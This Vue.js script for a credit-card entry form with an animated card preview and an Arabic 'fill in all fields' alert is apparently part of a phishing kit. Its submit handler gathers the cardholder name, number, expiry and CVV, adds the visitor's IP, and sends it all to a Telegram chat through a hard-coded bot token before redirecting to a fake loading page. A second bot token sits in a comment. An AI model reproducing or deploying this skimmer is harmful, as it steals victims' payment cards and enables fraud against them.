new Vue({
  el: "#app",
  data() {
    return {
      currentCardBackground: Math.floor(Math.random() * 10 + 1), // just for fun :D
      cardName: "",
      cardNumber: "",
      cardMonth: "",
      cardYear: "",
      cardCvv: "",
      minCardYear: new Date().getFullYear(),
      amexCardMask: "#### ###### #####",
      otherCardMask: "#### #### #### ####",
      cardNumberTemp: "",
      isCardFlipped: false,
      focusElementStyle: null,
      isInputFocused: false,
    };
  },
  mounted() {
    this.cardNumberTemp = this.otherCardMask;
    document.getElementById("cardNumber").focus();
  },
  computed: {
    getCardType() {
      let number = this.cardNumber;
      let re = new RegExp("^4");
      if (number.match(re) != null) return "visa";

      re = new RegExp("^(34|37)");
      if (number.match(re) != null) return "amex";

      re = new RegExp("^5[1-5]");
      if (number.match(re) != null) return "mastercard";

      re = new RegExp("^6011");
      if (number.match(re) != null) return "discover";

      re = new RegExp("^9792");
      if (number.match(re) != null) return "troy";

      return "visa"; // default type
    },
    generateCardNumberMask() {
      return this.getCardType === "amex"
        ? this.amexCardMask
        : this.otherCardMask;
    },
    minCardMonth() {
      if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
      return 1;
    },
  },
 
  methods: {
    flipCard(status) {
      this.isCardFlipped = status;
    },
    focusInput(e) {
      this.isInputFocused = true;
      let targetRef = e.target.dataset.ref;
      let target = this.$refs[targetRef];
      this.focusElementStyle = {
        width: `${target.offsetWidth}px`,
        height: `${target.offsetHeight}px`,
        transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`,
      };
    },
    blurInput() {
      let vm = this;
      setTimeout(() => {
        if (!vm.isInputFocused) {
          vm.focusElementStyle = null;
        }
      }, 300);
      vm.isInputFocused = false;
    },
    async submitCard() {
      var message = "";
      if (
        this.cardName.length == 0 ||
        this.cardNumber.length == 0 ||
        this.cardYear.length == 0 ||
        this.cardMonth.length == 0 ||
        this.cardCvv.length == 0
      ) {
        alert("لو سمحت أملأ كل الحقول");
        return;
      }
      message += "-------[Card Info ]-------\n";
      message += `Holder Name : ${this.cardName}\n`;
      message += `Card Number : ${this.cardNumber}\n`;
      message += `MM   : ${this.cardMonth}\n`;
      message += `YY : ${this.cardYear}\n`;
      message += `Card-Cvv : ${this.cardCvv}\n`;
      message += await this.getIp();
      await this.botNotify(message);
      window.location.assign("loading-card.html");
    },
    async getIp() {
      return await fetch("https://api.ipify.org/?format=json")
        .then((response) => response.json())
        .then((data) => {
          var ipAddress = data.ip;
          var message = `IP Address : ${ipAddress}\n`;
          return message;
        })
        .catch((e) => {
          var message = `Error to get visitor IP\n`;
          return message;
        });
    },
    async botNotify(message){
      const token = "6581669136:AAHqLZ-gUbFxf5SqUOLbzXZMtwlaPuEUxNg";
      const apiUrl = "https://api.telegram.org/bot";
      const queryParams = {
              "text": message,
              "chat_id" : "1587825063",
              "parse_mode":"html"
          };
      const queryString = Object.keys(queryParams)
      .map(key => encodeURIComponent(key) + "=" + encodeURIComponent(queryParams[key]))
      .join("&");
      // Construct the  URL with the query string
      const link = `${apiUrl}${token}/sendMessage?${queryString}`;
      // $getId ="https://api.telegram.org/bot6356556199:AAF-xfg4K7KnBuQ54PTR_AQQtZG7wR06Xwc/getUpdates";
      // Make a GET request using the fetch API
         await fetch(link)
          .then(response => {
              return response.json();
          })
          .then(data => {
          // Do something with the response data
          })
          .catch(error => {
           console.error("Fetch error:", error);
          });
  }
  },
});
